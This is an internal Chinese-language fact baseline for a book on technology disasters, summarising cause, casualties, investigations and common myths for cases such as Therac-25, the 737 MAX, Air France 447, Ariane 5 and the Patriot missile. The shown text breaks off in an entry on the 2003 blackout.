# 災難史實基準（內部文件，非書籍內容）— landscape 2026-06

全書事實錨；各章不得憑記憶，與此衝突以本檔為準；本檔不確定處標 ⚠️，重大修正需兩個獨立來源。

> 本檔為內部 fact baseline，非書籍內容。技術名詞保留英文，來源標題/URL 原樣保留。每個案例依固定模板填寫。建立時間 2026-06-13。

---

# A. 安全/自動化反成危害

## 1. Therac-25（1985–1987）— 放射治療 race condition

- **日期 / 地點**: 六起大劑量過量事故，1985 年 6 月至 1987 年 1 月。地點依序：Kennestone Regional Oncology Center（Marietta, Georgia，1985-06-03）、Hamilton（Ontario, Canada，1985-07-26）、Yakima Valley Memorial Hospital（Washington，1985-12）、East Texas Cancer Center（Tyler, Texas，1986-03-21 與 1986-04-11 兩起）、Yakima（1987-01-17）。✔（Leveson & Turner 1993）
- **死傷 / 規模**: 通說「至少六起過量、造成數名死亡與重傷」。✔（事故次數六起 = 文獻共識）。死亡人數常被引為「3 至 6 人」⚠️——可確證死亡：Tyler 兩名患者（1986-03 患者約 5 個月後死亡；1986-04 患者三週後死亡）、Yakima 1987 患者數月後死亡、Hamilton/Ontario 患者亦死亡。文獻多寫「至少 3 死、多人重傷」，確切總數因部分患者本身罹癌、難以單獨歸因放射過量而有爭議（標 ⚠️）。劑量：Tyler 估計患者實際吸收約 16,500–25,000 rad（處方僅約 180 rad 上下），即正常治療劑量的約 100 倍量級。✔（Leveson & Turner）
- **技術根因（精確）**: Therac-25 在多工環境執行，critical task（Treatment monitor、Servo）與非 critical task 並行存取共享記憶體，且對共享變數的 test 與 set 並非不可分割（non-atomic），存在 race condition。Tyler 事故的觸發：操作員在資料輸入畫面快速以游標鍵把 X-ray 模式改成 electron 模式，若編輯動作在某 8 秒時窗內完成，Datent 子程式與 Magnet 設定間的競態使機器在「電子束治療能量」設定卻未把 beam-flattening target 移入光束路徑的狀態下發射高能電子束，造成過量。第二類獨立 bug（Yakima 1987）：一個 8-bit 共享變數（class3 計數器）每次迭代加 1，每 256 次溢位歸零，恰在歸零的瞬間繞過了 collimator/turntable 位置檢查。根本上 Therac-25 移除了 Therac-20 上的獨立硬體保護電路與機械互鎖，改以軟體單獨保證安全；軟體大量沿用 Therac-6/Therac-20 的程式碼，由單一程式設計師以組合語言撰寫、缺乏獨立審查與正規測試。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 移除硬體互鎖（latent）：Therac-20 的機械互鎖與獨立保護電路在 Therac-25 被拿掉，安全責任全壓在未經嚴格驗證的軟體上。
  - 沿用舊碼的隱性假設（latent）：沿用 Therac-6/20 程式碼，但舊機種有硬體保護「兜底」，掩蓋了軟體缺陷；移植到無硬體保護的新機種後缺陷直接致命。
  - 錯誤訊息設計失敗（latent）：機器以晦澀代碼如「Malfunction 54」（文件解為 dose input 2 錯誤）提示，操作員被訓練成可直接以 P 鍵 proceed 略過，警示形同虛設。
  - 廠商歸因錯誤、否認軟體因素（trigger 放大）：AECL 多次將事故歸咎於微動開關故障、患者觸電等，總部工程師甚至宣稱機器「不可能過量」，延誤召回。
  - 缺乏事件記錄與可重現性（latent）：早期事故未被認真調查（Marietta「從未真正調查」），ETCC 物理師自行重現 Malfunction 54 才坐實「資料輸入速度是關鍵因素」。
  - 無獨立軟體安全分析與不合理的低風險評估（latent）：開發時對軟體可靠性過度自信，風險評估嚴重偏低。
- **官方調查 / 關鍵結論 + URL**: 無單一政府事故調查；權威分析為 Nancy G. Leveson & Clark S. Turner, "An Investigation of the Therac-25 Accidents," *IEEE Computer*, Vol. 26, No. 7, July 1993, pp. 18–41。中心結論：事故並非單一 bug，而是系統工程與軟體工程實務全面失敗（過度信任軟體、缺乏獨立保護、糟糕的錯誤處理與人機介面、廠商回應失當）。URL: https://dl.acm.org/doi/10.1109/MC.1993.274940 ；作者全文 PDF 常見於 https://web.mit.edu/6.033/2014/wwwdocs/papers/therac.pdf（如失效用 Leveson 著作《Safeware》或 ACM 連結）。
- **常見誤解 / 要校準的迷思**:
  - 「就是一個 race condition / 一個 bug」：錯。至少兩個獨立軟體缺陷（Tyler 的 Datent 競態、Yakima 1987 的 8-bit 計數器溢位），且真正根因是「移除硬體互鎖＋軟體單獨擔保安全」的系統決策。
  - 「是操作員打太快的人為失誤」：錯。操作員快速編輯只是觸發條件；缺陷在於系統允許這種競態存在、且無硬體兜底。
  - 「死了好幾十人」：誇大。確證重傷/致死為個位數患者，但每起劑量都極端致命。
  - 「Malfunction 54 是明確的危險警告」：錯。它是晦澀代碼，操作員被訓練成例行略過。
- **信心**: ⚠️ 技術根因 rock-solid（Leveson & Turner 為一級權威），但「確切死亡人數」各文獻略有出入（3–6），書寫時以「至少六起大劑量過量、數名患者死亡」表述、不要釘死單一死亡數字。

---

## 2. Boeing 737 MAX / MCAS（Lion Air JT610 2018、Ethiopian ET302 2019）

- **日期 / 地點**: Lion Air Flight 610（JT610），2018-10-29，起飛後墜入爪哇海（自 Jakarta 起飛）。Ethiopian Airlines Flight 302（ET302），2019-03-10，自 Addis Ababa Bole 機場起飛後約 6 分鐘墜毀。✔
- **死傷 / 規模**: JT610 機上 189 人全數罹難；ET302 機上 157 人全數罹難；合計 346 死。全球 737 MAX 機隊於 2019-03 起停飛約 20 個月。✔（兩份官方最終報告）
- **技術根因（精確）**: MCAS（Maneuvering Characteristics Augmentation System）是為補償 MAX 較大、較前置的 LEAP-1B 發動機在高攻角時造成的抬頭趨勢、使操縱手感符合既有 737 而加入的飛控功能。致命設計：MCAS 僅依賴「單一」AoA（angle-of-attack）感測器輸入、無雙感測器交叉比對；當該感測器讀數錯誤（JT610 為先前維修校準錯誤、ET302 為起飛時感測器受損/葉片脫落），MCAS 誤判飛機攻角過高，反覆下令水平安定面向下俯衝。原始設計授權量僅 0.6 度安定面行程，最終取證時放寬到每次最多 2.5 度，且可每約 5 秒重複觸發、無累積上限——飛行員每次手動拉回後，MCAS 又再次強力推頭向下，形成拉鋸直至失控。飛行員既不知 MCAS 存在（應 Boeing 之請，2016 年 FAA 核准將 MCAS 自飛行手冊移除），也未被訓練其失效模式；標準的 runaway-stabilizer/trim cutout 程序在高速、低空、反覆觸發下難以及時奏效。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 單點感測器無冗餘（latent）：安全攸關功能僅讀單一 AoA 感測器、無交叉比對，違反「safety-critical 不可單點失效」原則。
  - 授權量在開發中暗中放大（latent）：0.6 度 → 2.5 度、且可重複觸發，但取證文件未充分反映此變更對失效後果的放大，FAA 未重新嚴格評估。
  - 對飛行員隱藏 MCAS（latent）：手冊與訓練刻意不提 MCAS，飛行員無法把異常配平與特定系統連結、無法快速對症。
  - 取證自我授權失靈（latent）：FAA 透過 ODA 把大量取證工作委由 Boeing 自評，喪失獨立把關；JATR 與美國國會調查均指此制度缺陷。
  - 第一起後未停飛（trigger 放大）：JT610 後 Boeing/FAA 僅發 bulletin 重申 trim cutout 程序、未停飛也未硬體修正，導致 ET302 重演。
  - 人因/組織壓力（latent）：與 A320neo 競爭的時程與成本壓力、「讓 MAX 操縱手感與舊 737 相同以免重訓飛行員」的商業目標，是 MCAS 存在且被淡化的根源。
- **官方調查 / 關鍵結論 + URL**: (1) 印尼 KNKT/NTSC，*Final Aircraft Accident Investigation Report PT. Lion Mentari Airlines Boeing 737-8 (MAX) PK-LQP*（2019-10），列出 9 項 contributing factors，指 MCAS 設計、單一 AoA 依賴、取證、維修與機組因素交織。(2) 衣索比亞 EAIB（ECAA），ET302 最終報告（2022-12）。(3) 美國國會眾議院運輸委員會調查報告（2020-09）與 FAA JATR 報告。中心結論共識：這是「有缺陷的飛機設計＋失靈的取證」與機組/維修因素疊加，非單純飛行員失誤。KNKT 報告: http://knkt.go.id/Repo/Files/Laporan/Penerbangan/2018/2018%20-%20035%20-%20PK-LQP%20Final%20Report.pdf ；美國眾院報告: https://transportation.house.gov/imo/media/doc/2020.09.15%20FINAL%20737%20MAX%20Report%20for%20Public%20Release.pdf ；FAA RTS 摘要: https://www.faa.gov/sites/faa.gov/files/2022-08/737_RTS_Summary.pdf
- **常見誤解 / 要校準的迷思**:
  - 「外國飛行員技術差才摔，美國飛行員不會」：錯且有害。兩份報告與美國國會調查都把根因指向設計與取證；模擬器中 MCAS 反覆觸發＋極短反應時窗，連經驗飛行員都極難處置。
  - 「MCAS 是防失速系統」：不精確。MCAS 是操縱手感/縱向穩定增益功能（讓 MAX 手感像舊 737），非傳統失速保護；它在正常飛行包絡內也會被錯誤觸發。
  - 「就是一顆壞掉的感測器」：不完整。壞感測器是觸發，致命的是「單點依賴＋放大的權限＋對飛行員隱藏」這組設計與制度缺陷。
  - 「飛行員照 runaway-trim 程序就能救回」：要校準——ET302 機組確曾執行 trim cutout，但在高速下手動配平輪幾乎轉不動、程序在該情境下不足以恢復。
- **信心**: ✔ rock-solid（兩份官方最終報告＋美國國會調查；346 死、0.6→2.5 度、單一 AoA、自手冊移除皆多源一致）。

## 3. Air France 447（2009）— 皮托管結冰、自動化/模式混淆

- **日期 / 地點**: 2009-06-01，Airbus A330-203，AF447 自 Rio de Janeiro 飛 Paris，於大西洋中部赤道輻合帶（ITCZ）失事墜海。✔（BEA 最終報告 2012-07-05）
- **死傷 / 規模**: 機上 228 人全數罹難（216 名乘客＋12 名機組）。✔（BEA）
- **技術根因（精確）**: 巡航於約 FL350（35,000 ft）時，飛機的皮托管（Thales 型，已知在高空冰晶環境易短暫結冰）被冰晶阻塞，導致量測空速短暫不一致。autopilot 與 autothrust 依設計自動斷開，飛控由 normal law 降級為 alternate law（喪失迎角/失速等保護包絡）。PF（pilot flying）在亂流與不可靠空速下持續做出抬頭（nose-up）輸入，使飛機爬升、失速；攻角一度超過 40 度，飛機在約 3 分 30 秒內以最高約 10,000–11,000 ft/min（FDR 停止時約 10,912 ft/min）下沉，全程處於深度失速直到撞海。機組始終未辨識出這是失速、未做出標準失速改出（推頭、減小攻角）。stall warning 的行為加重混淆：當攻角過高、空速讀數低於有效門檻而被判定無效時，失速警告反而停止；當 PF 嘗試推頭、空速重新有效時警告又響起，給出「拉桿警告停、推桿警告響」的反直覺回饋。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 已知皮托管缺陷未強制改裝（latent）：Airbus/Air France 已知 Thales 皮托管在冰晶環境的問題、改裝在進行中，但 EASA 未列強制，事故機尚未更換。
  - 自動化降級交接設計（latent）：autopilot 在最需要時自動斷開，把處於高空、夜間、亂流、儀表不可靠的飛機瞬間丟回人手，且無攻角直接顯示。
  - 失速警告邏輯反直覺（latent）：低空速判定無效→警告停，使「正確的推頭動作」反而觸發警告、「錯誤的拉桿」反而讓警告停，誤導機組。
  - 機組手飛高空與失速改出訓練不足（latent）：BEA 指機組缺乏高空手動操縱與不可靠空速/失速改出的充分訓練與經驗。
  - 機組協調/情境覺察崩潰（trigger）：兩名副駕互不知對方持續拉桿（側桿無連動回饋）、機長返回駕駛艙時已難判讀，CRM 與情境覺察瓦解。
- **官方調查 / 關鍵結論 + URL**: BEA（法國航空事故調查局），*Final Report on the accident on 1st June 2009 to the Airbus A330-203 registered F-GZCP operated by Air France flight AF447*，2012-07-05。中心結論：事故源於「技術因素（皮托管結冰致空速不一致）＋人因（機組在 alternate law 下的不當輸入與未辨識失速）」的組合，並深入批評自動化交接、警告邏輯與訓練。報告: https://bea.aero/en/investigation-reports/notified-events/detail/accident-to-the-airbus-a330-203-registered-f-gzcp-and-operated-by-air-france-on-01-06-2009/
- **常見誤解 / 要校準的迷思**:
  - 「皮托管結冰把飛機弄掉了」：錯。結冰只造成約一分鐘的空速不一致，飛機本身仍可飛；是後續長達 4 分鐘的失速處置失敗導致墜毀。
  - 「純粹飛行員失誤」：不完整。BEA 強調是設計（自動化交接、反直覺的失速警告、無攻角顯示）、訓練與人因的系統性組合。
  - 「電腦關掉保護害死他們」：要校準——alternate law 確實移除了包絡保護，但根本問題是機組在無保護下未辨識失速並持續拉桿。
  - 「失速警告一直響他們卻不理」：反了——關鍵迷思是警告曾因空速無效而停止，造成「推頭→警告響、拉桿→警告停」的致命誤導。
- **信心**: ✔ rock-solid（BEA 一級報告；228 死、攻角>40°、約 10,912 ft/min、3 分 30 秒、皮托管結冰皆有來源）。

---

# B. 一個數字，一場崩塌

## 4. Ariane 5 Flight 501（1996）

- **日期 / 地點**: 1996-06-04，發射時刻 H0 = 當地 09:33:59（=12:33:59 UTC），法屬圭亞那 Kourou 發射場。約 H0+37 秒偏離航道、H0+39 秒解體爆炸，殘骸落於發射台以東約 12 km² 沼澤/莽原。✔（Inquiry Board report）
- **死傷 / 規模**: 無人傷亡（無人火箭首飛）。載荷為 ESA 的四顆 Cluster 磁層研究衛星全毀。財務損失通說「逾 3.7 億美元」（衛星＋火箭）⚠️——此數字常見但非調查報告數字，來源多為媒體/Wikipedia；亦有引「約 5 億美元」（含開發攤提）者。書寫時標「估計約 3.7 億美元」並註明非官方報告數字。✔（無傷亡）/ ⚠️（金額）
- **技術根因（精確）**: SRI（Inertial Reference System）內部軟體在執行「把一個 64-bit 浮點數轉成 16-bit 有號整數」時發生 Operand Error——該浮點數值大於 16-bit 有號整數可表示範圍（>32767）。出問題的變數是 BH（Horizontal Bias，水平偏差，與平台量測到的水平速度相關），作為對準精度隨時間的指標。此 BH 值遠超預期，因為 Ariane 5 飛行初段軌跡與 Ariane 4 不同、水平速度大得多。關鍵：出錯的程式只負責「strap-down 慣性平台的對準（alignment）」，其計算結果僅在升空前有意義；升空後此功能毫無用處，卻因沿用 Ariane 4 的需求被設定為「Flight Mode 啟動後（Ariane 5 為 H0−3 秒）持續運作 50 秒」，於是升空後仍多跑約 40 秒。此轉換指令（Ada 程式碼）未加保護，而同處其他可比變數的轉換有保護。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 重用 Ariane 4 程式碼但未重新驗證運行域（latent）：SRI 軟硬體幾乎照搬 Ariane 4，含一段升空後本不該再跑的對準功能與其 Ariane 4 專屬的 50 秒計時需求。
  - 刻意不保護部分轉換（latent）：7 個有溢位風險的變數中，只對 4 個加了 Ada 例外保護，3 個（含 BH）未保護——理由是 SRI 處理器設定 80% 最高負載上限，且工程判斷這 3 個變數「物理受限或有大安全裕度」。對 BH 的此判斷是錯的。
  - 設計決策被文件淹沒、無法外部審查（latent）：不保護的理由未直接寫在原始碼，淹沒在大量文件中，外部審查實質看不到。
  - 冗餘無效（防禦被同因擊穿）：兩套相同硬體/軟體的 SRI（active SRI 2 與 hot-standby SRI 1）因完全相同的軟體例外，在同一資料週期（72 ms）內先後失效；備援因 common-mode failure 形同虛設。
  - 例外處理策略致命（latent）：SRI 偵測到軟體例外後選擇「停機並回報診斷字組」，而非以保守值續行；OBC 把該診斷 bit pattern 當成姿態飛行資料，據以下達噴嘴全偏轉指令。
- **官方調查 / 關鍵結論 + URL**: *ARIANE 5 Flight 501 Failure — Report by the Inquiry Board*，主席 Prof. J. L. Lions，巴黎 1996-07-19。中心結論：主要技術因是 BH 轉換的 Operand Error 與該轉換未受保護導致 SRI 停機；更深層是「規格/設計與系統工程」缺陷而非單純編碼錯誤——重用軟體未重新檢視運行假設、例外處理導致整機停擺而非降級、測試未涵蓋實際 Ariane 5 軌跡。官方全文 PDF（MIT OCW）: https://ocw.mit.edu/courses/16-355j-software-engineering-concepts-fall-2005/91f1e550b30b00ad797293f430220f18_ari5fail_ful_rep.pdf ；ESA 新聞稿: https://www.esa.int/Newsroom/Press_Releases/Ariane_501_-_Presentation_of_Inquiry_Board_report
- **常見誤解 / 要校準的迷思**:
  - 「一行程式碼搞垮一枚火箭」：誤導。真正問題是系統與規格層級——重用未重新驗證的程式、刻意不保護的轉換、致命的例外處理（停機而非降級）、common-mode 冗餘失效。
  - 「就是單位/溢位的低級錯誤」：不完整。那段程式升空後根本不需要運作；它存在只因照抄 Ariane 4 的計時需求。錯不在轉換本身，而在「為何那段碼還在跑」。
  - 「備援系統失靈」：要校準——備援沒「壞」，是兩套用相同軟體、遇相同輸入必然同時死（common-mode failure），冗餘對軟體缺陷無效。
  - 「是浮點轉整數的數學問題」：表象。報告明說決定不保護 BH 的工程推理（認為它物理受限/有裕度）才是錯誤所在。
- **信心**: ✔ 技術根因與調查結論 rock-solid（一級官方報告原文已逐句核對）。僅財務損失金額為 ⚠️（非報告數字）。

## 5. Mars Climate Orbiter（1999）— 單位不一致

- **日期 / 地點**: 發射 1998-12-11；失聯 1999-09-23，最後載波訊號約 09:04:52 UTC，在火星軌道切入（MOI）進入火星掩星時失聯。✔（MCO MIB report）
- **死傷 / 規模**: 無人傷亡。任務全損；MCO 任務成本通常引為約 1.25 億美元（含太空船約 8,000 萬、發射與運營等）⚠️——數字隨「是否含發射/運營」而異，書寫時標「探測器約 1.25 億美元級任務」。✔（無傷亡）
- **技術根因（精確）**: 地面導航軟體中，一段由承包商 Lockheed Martin Astronautics 提供、計算 angular momentum desaturation（AMD，動量輪去飽和）推力效應的軟體（SM_FORCES / "Small Forces" 檔案）以英制 pound-force·seconds（lbf·s）輸出推力衝量，但接收端 JPL 的導航軟體預期 SI 單位 newton·seconds（N·s）。兩者差 1 lbf = 4.448 N，使推進事件累積的軌跡推算系統性偏差。結果 MOI 時近火點高度遠低於規劃：規劃約 226 km、可接受下限約 80 km，實際推算/重建約 57 km（一說低至約 57 km，遠低於探測器存活下限約 80 km），太空船過低進入大氣被燒毀或解體。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 介面規格未落實（latent）：軟體介面規格（SIS）要求 SI 單位，但 Lockheed 端輸出英制，且未端到端驗證。
  - 缺乏端到端導航軟體驗證（latent）：MIB 明列「未對導航軟體與相關模型做完整端到端驗證」。
  - 跡象被忽視（trigger 累積）：巡航期間導航團隊已注意到軌道修正（TCM）與推算的不一致、近火點偏差，但未被當成嚴重警訊正式追查。
  - 溝通與訓練不一致、團隊間銜接弱（latent）：MIB 列為 contributing cause——專案未把整體任務與發射後運營當成單一系統來考量。
  - 人力/流程薄弱（latent）：faster-better-cheaper 時代資源吃緊，缺少獨立檢查與充分人手追查異常。
- **官方調查 / 關鍵結論 + URL**: *Mars Climate Orbiter Mishap Investigation Board Phase I Report*，1999-11-10，主席 Arthur G. Stephenson（NASA Marshall 中心主任）。根因：地面軟體未把英制單位換成公制（lbf·s vs N·s）；但報告強調這是「過程失敗（process failure）」——單位錯誤能一路存活到撞火星，是因為缺乏檢查、驗證與系統觀。官方報告 PDF: https://llis.nasa.gov/llis_lib/pdf/1009464main1_0641-mr.pdf ；新聞稿: https://nssdc.gsfc.nasa.gov/planetary/text/mco_pr_19991110.txt
- **常見誤解 / 要校準的迷思**:
  - 「NASA 把公尺當英尺/搞錯公制英制這種低級錯」：要校準——確實是 lbf·s vs N·s，但 MIB 的核心訊息是「單位錯不該致命；致命的是沒有任何一層檢查抓到它」。把它講成「笨蛋算錯單位」反而錯失教訓。
  - 「是太空船上的程式錯了」：錯。出錯的是地面導航軟體（AMD/SM_FORCES 檔案），不是飛行軟體。
  - 「探測器一頭撞上火星表面」：不精確。是近火點過低、進入過深大氣，被氣動加熱/應力摧毀或失聯，並非撞地表。
  - 「沒人發現異常」：錯。導航團隊巡航期間已見偏差跡象，問題是未被正式當成重大異常處置。
- **信心**: ⚠️ 根因 rock-solid（lbf·s vs N·s、AMD/SM_FORCES、Lockheed 提供、缺端到端驗證皆官方報告）；近火點高度數字略有出入（規劃約 140–226 km、實際約 57 km，依不同文獻），書寫時用「規劃高度大幅高於實際、實際約 57 km 遠低於約 80 km 存活下限」並標 ⚠️。

## 6. Patriot missile, Dhahran（1991）— 浮點時間漂移

- **日期 / 地點**: 1991-02-25，Operation Desert Storm 期間，沙烏地阿拉伯 Dhahran；一枚 Iraqi Scud 擊中美軍兵營（駐有 14th Quartermaster Detachment）。✔（GAO/IMTEC-92-26）
- **死傷 / 規模**: 28 名美軍士兵死亡、約 100 人受傷。✔（GAO report；死亡 28 為一致數字）
- **技術根因（精確）**: Patriot 以系統開機以來的時間（內部時鐘以 1/10 秒整數計）乘以 0.1 換算成秒，此運算在 24-bit 定點暫存器進行。0.1 的二進位展開不終止，被截斷在小數點後 23/24 位，產生約 0.0000000953 的相對誤差（每個 1/10 秒帶一點點誤差）。誤差隨開機時間線性累積：連續運行約 100 小時後，時間誤差約 0.34 秒。Scud 速度約 1,676 m/s，0.34 秒對應約 570 公尺的位置偏差，使預測的 range gate（雷達追蹤波門）偏離真實目標、系統判定無目標而未發射攔截。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 設計假設與實際使用偏離（latent）：Patriot 原設計為機動防空、頻繁重啟、短時運行；波灣戰爭中作固定點防禦、連續運行遠超預期（此電池已連續運行約 100 小時，遠超約 20 小時的安全門檻）。
  - 不一致的修補（latent）：軟體某些地方用了更精確的時間換算、某些地方仍用舊的截斷算法；新舊不一致放大了相對時間誤差（兩個時間值誤差不對消）。
  - 更新太遲（trigger）：修正此時間計算的新軟體 1991-02-16 由陸軍釋出，但 1991-02-26（事故隔天）才送達 Dhahran。
  - 操作建議未落實（latent）：陸軍已知長時間運行有問題、建議定期重啟，但前線未確實執行「定期重開機清掉累積誤差」。
- **官方調查 / 關鍵結論 + URL**: U.S. General Accounting Office, *Patriot Missile Defense: Software Problem Led to System Failure at Dhahran, Saudi Arabia*, GAO/IMTEC-92-26, 1992。結論：軟體時間計算的浮點/定點截斷誤差隨運行時間累積，導致 range gate 偏移、未能追蹤該枚 Scud。官方 PDF: https://www.gao.gov/products/imtec-92-26 （亦見 https://www.gao.gov/assets/imtec-92-26.pdf）
- **常見誤解 / 要校準的迷思**:
  - 「浮點誤差『一次』就讓飛彈打偏」：錯。關鍵是誤差隨連續運行時間累積；同一系統若剛重啟則正常。是「不重啟」把微小誤差放大成致命偏差。
  - 「Patriot 攔截失敗炸到兵營」：錯。Patriot 根本沒發射（系統判定波門內無目標），不是攔截後失敗。
  - 「24-bit 浮點精度不夠」：要校準——更準確說是「0.1 在二進位無法精確表示，定點截斷」，且「系統內新舊時間算法不一致使誤差不對消」才是放大關鍵。
  - 「修補來不及純屬倒楣」：要校準——修補確實晚一天到，但更深層是「明知長時間運行有問題卻未強制定期重啟」的程序漏洞。
- **信心**: ✔ rock-solid（GAO 一級報告；28 死、約 100 小時、0.34 秒、1676 m/s、約 570 m 偏差皆有來源一致）。

## 7. Pentium FDIV bug（1994）—（板凳備選）

- **日期 / 地點**: 1994 年；由 Lynchburg College 數學教授 Thomas R. Nicely 在計算質數孿生時發現除法異常，1994-10 公開。影響 Intel Pentium（P5）處理器。✔
- **死傷 / 規模**: 無人傷亡（純計算正確性缺陷）。財務：Intel 於 1994-12（部分報導列 1995-01 提列）宣布稅前提列約 4.75 億美元 (US$475M)，作為全面更換瑕疵處理器的成本。✔（Intel 公告）。是 Intel 史上首次大規模處理器召回。
- **技術根因（精確）**: Pentium 的 FPU 改用 SRT（Sweeney–Robertson–Tocher）除法演算法，每週期可產生 2 個商數位元（486 為 1 位元）。SRT 需要一張查表（lookup table）來決定每步的商數位元；該表以 PLA（programmable logic array，2,048 cells，其中應有 1,066 cells 填入 −2、−1、0、+1、+2 之一）實作。把陣列編譯成製造光罩時，5 個本應為 +2 的表項未被微影設備正確寫入（成了空/0）。當除法運算落入需要這幾個缺失表項的特定運算元範圍時，會產生小幅但可觀的錯誤——某些高精度除法在第 4–5 位有效數字後即出錯（如著名的 4195835 / 3145727 結果偏差）。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 驗證未覆蓋查表角落（latent）：缺失的 5 個表項對應極少數運算元組合，常規測試/驗證未觸及，硬體驗證未窮舉查表。
  - 製造/光罩環節缺乏比對（latent）：陣列→光罩的轉換掉了 5 個值，且無事後與原始陣列逐項核對。
  - 初期公關處置失當（trigger 放大）：Intel 最初以「出錯機率極低、一般使用者一輩子碰不到」回應、只願「有需要才換」，引爆用戶與媒體反彈，反使品牌與財務損失遠大於缺陷本身。
  - 「正確性可機率性容忍」的錯誤心態（latent）：把可重現的確定性算術錯誤當成可接受的低機率事件。
- **官方調查 / 關鍵結論 + URL**: 無政府調查（商業產品缺陷）。權威技術分析：Alan Edelman, "The Mathematics of the Pentium Division Bug," *SIAM Review* 39(1), 1997。Intel 白皮書與 Edelman 論文確認 5 個缺失 PLA 表項為根因。Edelman PDF: https://math.mit.edu/~edelman/homepage/papers/pentiumbug.pdf ；矽晶層級逆向確認（Ken Shirriff, 2024）: https://www.righto.com/2024/12/this-die-photo-of-pentium-shows.html ；概觀: https://en.wikipedia.org/wiki/Pentium_FDIV_bug
- **常見誤解 / 要校準的迷思**:
  - 「整顆晶片設計爛掉」：錯。是查表中 5 個表項缺失這個極局部的製造/光罩缺陷，不是演算法或架構錯誤。
  - 「Intel 賠 4.75 億是被罰款」：錯。那是 Intel 自行提列的「更換成本」會計費用，非罰款。
  - 「機率低到無所謂」：這正是 Intel 最初的錯誤論點——缺陷是確定性、可重現的，對科學/金融計算可造成靜默錯誤；真正教訓是「正確性不可機率性打折」與危機公關。
  - 「Nicely 是 Intel 員工/官方發現」：錯。是外部數學家在做質數研究時偶然發現並公開。
- **信心**: ✔ rock-solid（根因經 Edelman 論文與 2024 矽晶逆向雙重確認；4.75 億為 Intel 公告）。板凳備選：技術根因紮實但「無傷亡、純算術正確性」，作為完整一章份量略單薄，更適合作為「一個數字」群的對照短案例。

---

# C. 級聯 / 緊耦合失效

## 8. AT&T 長途網路崩潰（1990-01-15）— 交換機軟體缺陷

- **日期 / 地點**: 1990-01-15，起於紐約市一台 #4ESS 長途 toll switch，蔓延至全美 AT&T 長途網路。✔
- **死傷 / 規模**: 無人傷亡。約 9 小時服務中斷；尖峰時約 50% 經 AT&T 的長途通話無法接通；通說「約 7,000 萬通電話未能接通」⚠️（亦見「約 5,000 萬通被阻」「6 萬名直接客戶失去長途」等不同切面數字，視「未接通 vs 被阻 vs 直接客戶」而異）。估計 AT&T 營收損失達數千萬美元級。✔（無傷亡、約 9 小時、約 50% 為一致）/ ⚠️（通話數字依定義不同）
- **技術根因（精確）**: 1989-12 中旬，AT&T 對全部 114 台 #4ESS 交換機部署了一版新軟體（為加速 SS7 訊息處理）。其中一段 C 程式碼有 bug：一個 break 敘述被放在 switch 內某 if 子句中，程式設計師誤以為該 break 只跳出 if，實際卻提前跳出了外層結構。觸發鏈：當一台 4ESS 因小故障短暫自我隔離、重置（清空通話、重啟約需 4–6 秒）後，它向鄰機發出「我恢復了」的 SS7 訊息；鄰機在處理此訊息的極短時窗內（約數毫秒/10 ms 級）若又收到第二個訊息，前述 break 缺陷使程式提前跳出、覆寫了關鍵的通話處理資料；鄰機偵測到自身資料毀損，便也自我隔離、重置——重置後又發「我恢復了」訊息，把同一缺陷傳染給它的鄰機。於是 114 台交換機陷入「重置→發訊息→傳染→鄰機重置」的振盪，每約 6 秒一輪，持續約 9 小時。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 同一缺陷軟體佈滿全網（latent）：114 台交換機跑完全相同的新軟體——monoculture，任何 common-mode 缺陷必然全網同時可被觸發。
  - 「恢復」訊息成為傳染媒介（latent）：本意是健康回報的「我恢復了」訊息，恰是把缺陷傳給鄰機的觸發器；自我修復機制反成擴散管道。
  - 測試未覆蓋並發時窗（latent）：bug 只在「處理第一個訊息時又來第二個」的數毫秒競態下觸發，AT&T 號稱嚴格的測試未涵蓋此並發路徑。
  - 正回饋無阻尼（latent）：重置→發訊息→引發鄰機重置，形成正回饋環，系統無「退避/降載」機制阻斷振盪。
  - 觸發只是一次例行小故障（trigger）：最初那台交換機的故障本身微不足道；致命的是缺陷把「單機正常的自我復原」變成「全網級聯」。
- **官方調查 / 關鍵結論 + URL**: 無政府事故調查；AT&T 內部調查確認根因為新軟體升級中的該 C 程式缺陷。修復：先降低 SS7 訊息負載打斷振盪，再回退（revert）至前一版軟體。經典紀錄見 ACM SIGSOFT *Software Engineering Notes* 與 RISKS Digest（comp.risks）相關討論。概觀與技術描述（Cal Poly 課程整理）: https://users.csc.calpoly.edu/~jdalbey/SWE/Papers/att_collapse ；RISKS Digest 索引: https://catless.ncl.ac.uk/Risks/9.62
- **常見誤解 / 要校準的迷思**:
  - 「一個漏掉的 break 害的」：要校準——break 並非「漏掉」，而是「放錯位置/作用域被誤解」（在 switch 內的 if 中，誤以為只跳出 if）。且真正災難是它在並發時窗下覆寫資料、再經「恢復訊息」級聯放大。
  - 「駭客攻擊/實體斷線」：錯。純軟體缺陷觸發的自我級聯，無外部攻擊（雖事發初期一度被懷疑為駭客）。
  - 「升級時的設定錯誤」：錯。是新軟體本身的程式邏輯缺陷，非組態錯誤。
  - 「全網一次性宕掉」：不精確。是 114 台以約 6 秒週期反覆重置振盪約 9 小時，而非一次性全黑。
- **信心**: ⚠️ 技術機制 rock-solid（多源一致、RISKS/ACM 有當代紀錄），但「未接通/被阻通話數」依口徑不同（5,000 萬–7,000 萬）有出入，書寫時用「約半數長途通話、數千萬通受影響、約 9 小時」並標 ⚠️。

## 9. 美加東北大停電（2003-08-14）— 告警軟體 race condition + 樹木

- **日期 / 地點**: 2003-08-14，下午起於美國俄亥俄州（FirstEnergy 轄區），蔓延至美國東北/中西部八州與加拿大安大略。✔
- **死傷 / 規模**: 影響約 5,000 萬人、損失供電約 61,800 MW；部分地區停電逾 1–2 日；估計經濟損失約 40–100 億美元（常引約 60 億美元）。直接因停電致死人數說法不一⚠️（一說約 11 人，含醫療設備斷電、一氧化碳中毒等間接死亡）。✔（5,000 萬人、61,800 MW 為任務小組報告）/ ⚠️（死亡與經濟損失金額）
